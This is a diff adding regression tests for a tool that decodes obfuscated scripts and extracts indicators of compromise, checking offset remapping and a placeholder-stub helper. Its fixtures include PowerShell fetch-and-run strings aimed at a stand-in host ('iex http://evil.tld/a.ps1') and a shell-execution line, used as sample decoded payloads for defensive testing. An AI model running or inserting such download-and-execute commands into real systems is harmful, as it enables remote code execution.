@@ -432,6 +432,131 @@ test('analyze() diffs IOCs against existingIocs.allValues — already-known valu
   assert.equal(out.novelIocs[0]._reconstructedHash, 'deadbeefcafebabe');
 });
 
+// ── Regression: `analyze()` rewrites `_sourceOffset`/`_sourceLength` from
+//    stripped-text coordinates to source-text coordinates ─────────────────
+//
+// `extractInterestingStringsCore` (the real function, not our stubs) writes
+// `_sourceOffset` + `_sourceLength` onto every row it emits — but those
+// indices point into whatever buffer was FED to it (here, the sentinel-
+// stripped reconstructed body), NOT into the original source file. Before
+// the fix, `analyze()` read a `row.offset` field that the core never
+// populates, so the mapping branch never fired and the stale stripped-text
+// offsets leaked through untouched — click-to-focus in the sidebar then
+// highlighted whatever source byte happened to live at that stripped
+// offset, which for splice-adjacent IOCs was routinely the wrong line.
+//
+// This test constructs a reconstruction with one splice and one verbatim
+// copy-through, feeds a stubbed-core result that stamps stripped-text
+// offsets, and asserts `analyze()` rewrites them via mapStrippedToSource.
+test('analyze() remaps _sourceOffset/_sourceLength from stripped-text coords to source coords (splice row)', async () => {
+  // Source layout (60 bytes):
+  //   [0..10)  "prefix--- "                     (10-byte verbatim prefix)
+  //   [10..40) "encoded-payload-30-bytes-long!" (30-byte splice → decoded
+  //                                              "iex evil.tld", 12 bytes)
+  //   [40..60) "  trailing-text-here"           (20-byte verbatim tail;
+  //                                              "trailing" starts at 42)
+  const source = 'prefix--- encoded-payload-30-bytes-long!  trailing-text-here';
+  const decoded = 'iex evil.tld'; // 12 bytes
+  const text = 'prefix--- '
+    + SENTINEL_OPEN + decoded + SENTINEL_CLOSE
+    + '  trailing-text-here';
+  const sourceMap = [
+    { reconOffset: 0,  sourceOffset: 0,  length: 10, isSplice: false, strippedOffset: 0,  strippedLength: 10 },
+    { reconOffset: 10, sourceOffset: 10, length: 30, isSplice: true,  sourceLength: 30,  strippedOffset: 10, strippedLength: 12 },
+    { reconOffset: 10 + SENTINEL_OPEN.length + decoded.length + SENTINEL_CLOSE.length,
+      sourceOffset: 40, length: 20, isSplice: false, strippedOffset: 22, strippedLength: 20 },
+  ];
+  const recon = { text, spans: [{}], sourceMap, reconstructedHash: 'cafef00d00000000' };
+
+  // Two rows, each carrying stripped-text `_sourceOffset`/`_sourceLength`
+  // exactly the way the real `extractInterestingStringsCore` stamps them.
+  //   • `evil.tld` lives inside the splice, stripped-offset 14, length 8.
+  //     Expected result: source offset 10 (the splice's `sourceOffset`),
+  //     length 30 (the splice's `sourceLength` — the whole encoded span,
+  //     since the decoded value never existed verbatim in source).
+  //   • `trailing` lives in the verbatim tail at stripped offset 24
+  //     (two leading spaces at 22, 23 → 't' at 24), length 8. Expected
+  //     result: source offset 42 (40 + (24-22)), length 8.
+  const spliceRow   = { url: 'evil.tld', type: 'url',  _sourceOffset: 14, _sourceLength: 8 };
+  const verbatimRow = { url: 'trailing', type: 'word', _sourceOffset: 24, _sourceLength: 8 };
+
+  const out = await analyze(recon, {
+    extractInterestingStringsCore: stubExtract([spliceRow, verbatimRow]),
+    existingIocs: { allValues: new Set() },
+    workerManager: fakeWM(),
+    yaraSource: 'rule Z { condition: false }',
+  });
+
+  assert.equal(out.novelIocs.length, 2);
+  const [a, b] = out.novelIocs;
+
+  // Splice row: remapped to the encoded span's source offset + length.
+  assert.equal(a.url, 'evil.tld');
+  assert.equal(a._sourceOffset, 10, 'splice row maps to the splice sourceOffset');
+  assert.equal(a._sourceLength, 30, 'splice row takes the whole encoded span length');
+  assert.equal(a._highlightText, 'evil.tld', 'highlight text stays the IOC value itself');
+  // Sanity: slicing the source with the stamped offsets must land on the
+  // ENCODED region, not wherever the stripped offset happened to fall.
+  assert.ok(source.slice(a._sourceOffset, a._sourceOffset + a._sourceLength).includes('encoded-payload'));
+
+  // Verbatim row: remapped to exact source offset + row's own length.
+  assert.equal(b.url, 'trailing');
+  assert.equal(b._sourceOffset, 42);
+  assert.equal(b._sourceLength, 8);
+  assert.equal(source.slice(b._sourceOffset, b._sourceOffset + b._sourceLength), 'trailing');
+});
+
+test('analyze() clears _sourceOffset/_sourceLength when stripped offset cannot be mapped', async () => {
+  // Same reconstruction as above but the row's stripped offset sits
+  // beyond the end of every sourceMap entry → mapping must fail.
+  const decoded = 'iex evil.tld';
+  const text = 'prefix--- '
+    + SENTINEL_OPEN + decoded + SENTINEL_CLOSE
+    + '!  trailing-text-here';
+  const sourceMap = [
+    { reconOffset: 0,  sourceOffset: 0,  length: 10, isSplice: false, strippedOffset: 0,  strippedLength: 10 },
+  ];
+  const recon = { text, spans: [{}], sourceMap, reconstructedHash: 'cafef00d00000001' };
+
+  const orphanRow = { url: 'orphan', type: 'word', _sourceOffset: 9999, _sourceLength: 6 };
+  const out = await analyze(recon, {
+    extractInterestingStringsCore: stubExtract([orphanRow]),
+    existingIocs: { allValues: new Set() },
+    workerManager: fakeWM(),
+    yaraSource: 'rule Z { condition: false }',
+  });
+
+  assert.equal(out.novelIocs.length, 1);
+  const r = out.novelIocs[0];
+  // Stale stripped-text offset must NOT leak through as a source offset —
+  // the fix clears the pair rather than leaving a misleading pointer.
+  assert.equal(r._sourceOffset, undefined, 'stale offset is cleared on mapping failure');
+  assert.equal(r._sourceLength, undefined);
+  assert.equal(r._highlightText, 'orphan', 'highlight text is always the IOC value');
+});
+
+// ── Regression: `_isPlaceholderStub` is exported so the sidebar's
+//    per-finding preview can reject the same synopsis envelopes the
+//    reassembler already skips. Single source of truth.
+test('EncodedReassembler._isPlaceholderStub is exported and matches binary / marshal synopsis envelopes', () => {
+  const isStub = EncodedReassembler._isPlaceholderStub;
+  assert.equal(typeof isStub, 'function', 'helper is exposed on the module surface');
+  // Positive cases — the two envelope types python-obfuscation.js and
+  // php-obfuscation.js emit when they decode to non-printable bytes.
+  assert.equal(isStub('<binary 45B: 789c2b4a2dce…>'), true);
+  assert.equal(isStub('<binary 45B (likely marshal/pickle): 789c2b4a2dce…>'), true);
+  assert.equal(isStub('<binary 128B (likely compressed): 1f8b0800…>'), true);
+  assert.equal(isStub('<marshal payload 128B>'), true);
+  // Negative cases — real decoded text must pass through.
+  assert.equal(isStub('subprocess.run(["sh", "-c", "id"])'), false);
+  assert.equal(isStub('iex http://evil.tld/a.ps1'), false);
+  assert.equal(isStub(''), false);
+  assert.equal(isStub(null), false);
+  assert.equal(isStub(undefined), false);
+  assert.equal(isStub(42), false);
+});
+
+
 test('analyze() records skipped.extract when no extract fn is injected', async () => {
   const out = await analyze(RECON, {
     workerManager: fakeWM(),
